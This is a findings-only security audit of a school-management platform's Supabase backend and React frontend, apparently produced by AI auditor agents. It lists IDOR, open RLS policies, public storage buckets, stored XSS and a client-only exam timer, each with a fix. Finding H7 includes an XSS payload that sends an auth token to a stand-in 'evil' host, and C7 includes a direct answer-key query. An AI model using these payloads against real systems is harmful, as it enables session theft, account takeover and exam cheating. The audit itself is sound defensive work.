# SALCI Security Audit — Section 3 (Application & Data Layer) — 2026-07-07

**Method:** 8 parallel dimension auditors (secret leakage, edge-fn authz/IDOR, over-permissive
RLS, public buckets, XSS, exam integrity, auth/session/CORS, un-swept frontend QA), each HIGH/
CRITICAL finding then put through an independent adversarial refutation pass (28 agents total,
Opus). Only findings that survived refutation with a concrete, reachable exploit path are listed
as Confirmed. **No changes have been made — this is findings-only, per the audit ground rules.**

> ⚠️ Several Critical items are **live-exploitable on production right now** (account takeover,
> answer-key read, exam-timer bypass). These warrant urgent attention even though the fixes are
> small. None require key/credential rotation.

## Executive summary

**Confirmed: 18 exploitable — 7 Critical, 11 High.** ~35 medium/low QA items flagged (unverified).
1 alarming claim (public `exam-sheets` bucket → pre-window exam leak) was **refuted**.

Two structural root causes dominate:
1. **Edge functions and RLS policies that check *a* role but never *ownership / institution scope*** — the IDOR family.
2. **Security controls enforced only in the React client** (exam timer, password-reset lockout, answer-key sanitization) with the underlying table/RPC left open.

### The 3 worst
1. **Account takeover of any user, by any student** — `admin-operations reset_user_password` has no role gate; a student can set a school_admin's password and log in as them → full institution compromise.
2. **Live exam answer-key exposure** — the RLS-tightening migration for `exam_questions` is staged but **not applied to prod**, so students can still read `correct_answer` / `options.isCorrect` / `explanation` directly via PostgREST before and during the exam.
3. **Client-only exam timer** — the server accepts answer writes and submissions with no deadline check; a student who bypasses the React countdown gets unlimited exam time.

---

## Confirmed Findings

### Critical

**[C1] `admin-operations reset_user_password` has no role gate** — `supabase/functions/admin-operations/index.ts:979-1064` (auth block 1011-1020).
Any authenticated user (student/teacher/employee) calls with `action=reset_user_password`, `userId=<any same-institution user>`, `newPassword=<chosen>`. The action is absent from the gating switch (233-335); the only inline guard checks institution match, not caller role. A student caller skips the school_admin-protection branch and can reset a **school_admin's** password, then log in → full institution compromise. Write goes through the service-role client, bypassing RLS.
*Fix:* Gate the top of `reset_user_password` on `isSuperAdmin || isSchoolAdmin || isCoordinator || isTeacher` (mirror `update_user` at 1115-1128) + enforce the not-a-higher-role rule for non-admin callers.

**[C2] `teacher_effectiveness` — "Service can manage effectiveness" grants ALL to `{public}` USING true** — migration `20260116145049:105-108`.
`cmd=ALL`, `roles={public}`, `USING true`, no `WITH CHECK`, no `TO service_role`. Any authenticated (or anon) user can SELECT/INSERT/UPDATE/DELETE every teacher's `effectiveness_score` / `pass_rate` / `avg_student_improvement` across all institutions.
*Fix:* Drop the policy or scope it `TO service_role` / add institution+ownership predicate.

**[C3] `passport_academic_records` / `passport_subject_capabilities` — cross-tenant INSERT & UPDATE** — migration `20260226052445:63-71,85-93`.
INSERT policies `WITH CHECK (true)`, UPDATE `USING (true)` with no `WITH CHECK`, both `TO authenticated`. A student at School A can INSERT arbitrary academic-credential rows for any student in any institution and UPDATE existing `average_percentage` / `rank_in_class` / `capability_tier` / `mastery_level` — direct grade/credential tampering. SELECT policies on the same tables are correctly scoped.
*Fix:* Replace with per-student authorization predicate + institution match, matching the SELECT scoping.

**[C4] `lms_lead_pocs` — "Authenticated can manage pocs" grants ALL USING/CHECK true** — verified live on prod.
The sales CRM shares one Supabase project + one GoTrue auth realm with the school portal, so every student/teacher/parent login is Postgres role `authenticated`. With `ALL` / `USING true` / `WITH CHECK true`, any such user can read/insert/update/**delete** every lead point-of-contact (prospect names, emails, phones, budget authority) via PostgREST — cross-system PII read + full pipeline tampering.
*Fix:* Gate writes on `lms_has_role(...)`; restrict reads to assigned/role-scoped users.

**[C5] `answer-sheets` storage bucket is PUBLIC — graded answer-sheet scans served with no auth/expiry** — bucket `answer-sheets` (migration `20260116084930`); `src/hooks/useOfflineScan.ts:282`, `src/components/offline-scan/OfflineScanFlow.tsx:200-202`.
Uploads use `getPublicUrl` (non-expiring), persisted to `ocr_uploads.file_url`. Anyone with a URL (shared link, history, referer, proxy log) fetches any student's scanned graded answer sheet with one unauthenticated GET; no RLS on public-bucket reads and URLs can't be revoked. (Mass-enumeration via `ocr_uploads` anon-SELECT was refuted — that table has RLS; paths are UUIDs — so the harm is confidentiality-on-URL-disclosure, not bulk scrape.) Contrast the private+signed `hybrid-answer-sheets` bucket.
*Fix:* Set `public:false`, add institution-scoped storage RLS, read via `createSignedUrl(path, 300)`.

**[C6] Exam timer/deadline enforced only on the client** — `save_exam_answer()` / `submit_exam_attempt()` in migration `20260104120228` (619-673 / 581-613); client countdown `src/hooks/useExamAttempt.ts:444-459`.
Attempt *creation* is window-checked, but `save_exam_answer` validates only `student_id = auth.uid() AND is_submitted=false AND is_locked=false` — no `end_time` / `started_at + duration` predicate. A student starts legitimately, bypasses the React `setInterval` (devtools or a direct `supabase.rpc('save_exam_answer', …)` call) and saves/revises indefinitely, submitting whenever. Helper functions `get_attempt_remaining_time()` / `should_auto_lock_attempt()` exist but have **zero callers** — abandoned attempts are never server-auto-submitted. (Mainline `student_exam_attempts` plane only; Olympiad `oly_attempts` enforces timers server-side.)
*Fix:* Add a server-side deadline guard inside both RPCs; add a cron to auto-lock/auto-submit expired attempts.

**[C7] Answer key still directly readable by students via PostgREST — migration `20260707131000` NOT applied to prod** — live policy migration `20260112124908:355-370`; fix staged in `supabase/migrations/20260707131000_exam_questions_student_rls_tighten.sql`.
Frontend was switched to the sanitized `get_exam_paper` RPC, but table RLS wasn't changed. The live policy authorizes SELECT on all columns via `is_assigned_to_exam_class(auth.uid(), es.exam_id)` (joins `class_assignments`, no role filter → students match) with no submitted-attempt gate. A student can `GET /rest/v1/exam_questions?select=id,correct_answer,options,explanation&section_id=eq.<id>` before/during the exam and read the full key. `get_exam_paper` only closed the app-UI path.
*Fix:* Now that the sanitized-RPC frontend is deployed, apply `20260707131000` after smoke-testing one live attempt + one results review.

### High

**[H1] `generate-principal-tasks` fully unauthenticated** — `supabase/functions/generate-principal-tasks/index.ts:37-53`; `verify_jwt=false`.
Anonymous POST `{institution_id, principal_id}` for any school → returns teacher full names, class average scores, fail rates, struggling-student counts (cross-tenant PII/analytics leak); also DELETEs all pending `ai_suggested_tasks` for the supplied `principal_id` and INSERTs attacker-influenced rows.
*Fix:* Add JWT + admin-role check; confirm caller administers `institution_id`.

**[H2] `send-fee-reminder` institution-scoping is a no-op (IDOR)** — `supabase/functions/send-fee-reminder/index.ts:88-101`.
The "scoping" block computes `invalidStudents = profiles.filter(p => false)` — always empty, never used. A school_admin from institution A passes institution B's `student_ids` and receives each victim's `full_name` + installment count + `total_due`, and injects a fee-reminder notification into each victim's feed. Service-role client, no institution predicate.
*Fix:* Join `profiles→institution_id`, reject any `student_id` outside the caller's institution before fetching/notifying.

**[H3] `generate-exam-insights` fully unauthenticated (IDOR write + billing abuse)** — `supabase/functions/generate-exam-insights/index.ts:14-25,161-174`; `verify_jwt=false`.
Anonymous POST `{attemptId:<any>}` → reads that student's results, calls the AI gateway, upserts an `exam_insights` row keyed on the attacker-supplied `attemptId`. Enumerate `attemptId`s to mass-overwrite insights / burn AI credits. (Response is only `{success:true}` — the harm is unauthenticated IDOR-write + billing abuse, not direct exfiltration.)
*Fix:* Require JWT; confirm caller owns `attemptId` or teaches/admins the exam's institution.

**[H4] `auto-grade-submission` checks role but not record ownership (IDOR)** — `supabase/functions/auto-grade-submission/index.ts:186-211`.
A teacher at School A (any teacher/coordinator/admin role anywhere) calls with an `attempt_id` from School B + an arbitrary `grader_id`. Role check has no institution/class predicate; attempt fetched by id with no scoping. Writes `ai_evaluations` + `teacher_overrides` (`evaluated_by` = attacker-supplied `grader_id`) and flips `evaluation_status` for the victim attempt — cross-tenant grade tampering with forged grader attribution.
*Fix:* Resolve the exam's institution/class from `attempt_id`, verify the caller teaches/administers it; derive `grader_id` from the JWT.

**[H5] `lms_profiles` — "authenticated_read" exposes internal staff roster to every portal user** — SELECT `qual=true`, `roles={authenticated}`.
Shared auth realm → any school student/teacher can SELECT the entire internal sales/HR staff directory (name, email, phone, designation, staff_type). The permissive `true` policy OR-overrides the correctly-scoped own-row/admin policies.
*Fix:* Remove the `qual=true` policy; rely on own-row + lms-admin policies.

**[H6] `lms_school_profiles` — "Authenticated can view school profiles" leaks the entire prospect pipeline** — verified live; SELECT `qual=true`, `roles={authenticated}`.
Any logged-in school user can `GET /rest/v1/lms_school_profiles?select=*` and read every prospect record (board, city, current_software, modules_of_interest, tier, student_count, `lead_id`).
*Fix:* Replace `qual=true` with an lms-role/assignment predicate.

**[H7] Stored XSS — student `full_name` unescaped in `ExamReportPDF`** — `src/components/exam-results/ExamReportPDF.tsx:77` (71-83, 86).
A student sets their display name (via `/profile`, no role gate; RLS UPDATE `USING(id=auth.uid())` has no column restriction) to `<img src=x onerror=fetch('https://evil/?t='+localStorage['sb-…-auth-token'])>`. When a teacher/principal generates the class exam-report PDF, `s.studentName` is interpolated raw into `content.innerHTML`; html2pdf attaches the node to the live DOM, firing `onerror` in the **staff** session → auth-token exfiltration → privileged takeover. Sibling `DashboardSnapshotReport` correctly `esc()`s.
*Fix:* HTML-escape `studentName` and all user-derived fields before interpolation.

**[H8] Stored XSS — student `full_name` unescaped in `StudentReportPDF`** — `src/components/exam-results/StudentReportPDF.tsx:92` (sink `innerHTML` at 85).
Same student-set `full_name` payload; when a teacher/admin downloads an individual report card, `${s.studentName}` is templated raw and rendered via html2pdf in the staff browser. Route is ProtectedRoute-gated to staff → genuine cross-privilege stored XSS.
*Fix:* HTML-escape `studentName` (and tag strings) before templating.

**[H9] Stored XSS — student name unescaped in CBSE class report generator** — `src/utils/generateCBSEReports.ts:110` (sink `container.innerHTML` at 123).
Same `full_name` reaches `studentTable()` as `s.name` (via `useCommandCenter.ts:110`) and is interpolated raw, rendered by html2pdf in the principal/admin browser during CBSE report generation.
*Fix:* Add `escapeHtml` and apply to `s.name`, `s.class`, and other data-derived fields.

**[H10] Password expiry & `must_reset_password` enforced only client-side — fully bypassable** — `src/hooks/useAuth.ts:182-195` + `src/pages/PasswordResetRequired.tsx`.
Only enforcement is `useRequireAuth` calling `navigate('/password-reset-required')`. A flagged user keeps a valid JWT and can call PostgREST/RPC/edge functions directly (`autoRefreshToken` keeps it alive). Worse, the RLS UPDATE policy `USING(id=auth.uid())` has no column restriction, so a user can self-clear `must_reset_password` / `password_expires_at` on their own row without changing the password.
*Fix:* Enforce server-side via a Postgres `custom_access_token` auth hook or RLS keyed on these flags; forbid self-UPDATE of those columns.

**[H11] Unauthenticated `resolve-login-identifier` leaks email + role (enumeration + PII)** — `supabase/functions/resolve-login-identifier/index.ts:88-177`; `verify_jwt=false`, CORS `*`.
No auth. Given a guessable admission/roll/phone, returns the user's real email + primary role + `is_active`. Rate limit is per-identifier and in-memory, so iterating `ADM0001, ADM0002, …` hits a fresh bucket each request → harvest a school's full email/role directory unthrottled, including admin accounts.
*Fix:* Return only the login email (never the role); rate-limit per source IP; add captcha/short-lived token; restrict CORS to the salci.org/salci.sale allowlist.

---

## Lower severity / QA (unverified — confirm before fixing)

**Edge-fn authz gaps (role-checked but not scoped, or unauthenticated):** `process-ocr-upload`
(cross-inst OCR+grade), `promote-students` (no target-student check), `compute-aggregates`
(cross-inst overwrite), `generate-learning-actions` (cross-inst write), `snapshot-student-passport`
(unauth cross-tenant write/DoS), `mark-biometric-attendance` (`fingerprint_hash` never verified →
attendance forgery), `generate-questions` (auth optional → quota-check skip / AI billing abuse),
`generate-predictions` (unauth AI billing abuse), `import-syllabus-csv` (school_admin writes GLOBAL
tables + `csvUrl` SSRF), `send-welcome-email` / `invite-admin` (unauth open email relay from trusted
domains → phishing + Resend quota), `send-task-notifications` (unauth notification spam).

**Broad/open RLS (verify vs prod):** ~14 `lms_*` blanket `qual=true` SELECT + open-INSERT tables;
`staff_salary_structures` (intra-tenant salary-band over-share); `notifications` INSERT `WITH CHECK
true` (any user injects notifications to any user → phishing via the trusted bell); `exam_insights` /
`ai_suggested_tasks` INSERT `WITH CHECK true`; `employee_levels` readable by all (privesc recon).

**Public buckets (defense-in-depth):** `question-images`, `study-materials`, `circular-attachments`,
`task-evidence`, `task-voice-comments` all public via `getPublicUrl` → leaked URLs expose content
with no expiry. Move to private + signed URLs.

**Client/session:** `MathPreview` doesn't escape non-math text (author-to-author XSS); full Supabase
session (incl. long-lived refresh token) in localStorage → any XSS = durable takeover (add strict CSP
+ refresh-token rotation); weak client-only 8-char password policy, bulk-set passwords bypass it
(enable project-level password policy + leaked-password protection); wildcard
`Access-Control-Allow-Origin: '*'` on ~60 edge functions (restrict to allowlist via `_shared/cors.ts`;
no `Allow-Credentials` so not direct token theft, but a lost defense layer).

**Error-as-empty-state (CLAUDE.md §6 — failures render as "no data"):** Fees — `DefaulterTracker`
("all payments on track" on failure), `FeeStructurePanel` / `StudentFeesPanel` / `FeeConcessionPanel` /
`InstallmentSchedulePanel` / `FeeAnalyticsDashboard` (no error branch), `FeeCollectionPanel` receipts
(no loading state). HR — `StaffDirectoryTab` / `MySalaryPanel` / `StaffLeavePanel` (no error branch);
missing empty states across several staff/payroll/salary panels.

**Dead code:** `src/components/learning/` orphaned (imported only by dead `TeacherDashboard.tsx`);
`StudentLearningTasks` renders query errors as empty. Delete or wire into a live dashboard.

**Confirmed-secure (for completeness):** scoring is fully server-side and role-gated
(`auto-grade-submission` clamps marks against a service-role-fetched `correct_answer` — no client
score is trusted); attempt start/submit/save are idempotent (`UNIQUE(exam_id,student_id)` + `ON
CONFLICT` upsert); the answer-key-leaking `exam_questions(*)` embed was removed from the student
attempt flow (residual embed in `useExamDrafts.ts` is author-only); no `service_role` key found in
frontend code or committed env.

---

## Refuted (checked and dismissed)

- **`exam-sheets` bucket public → cross-tenant pre-window exam-paper leak** — REFUTED. Bucket is
  public, but every reachability link fails: `exams` has no anon SELECT, storage paths are
  `randomUUID`, cross-tenant reads were closed by migration `20260603130000`, and `getExamPaperUrl`
  is used only in the student *results* view for already-conducted offline exams. A weak
  defense-in-depth concern (a legitimately-issued public URL works indefinitely if leaked) remains
  and was consciously accepted.
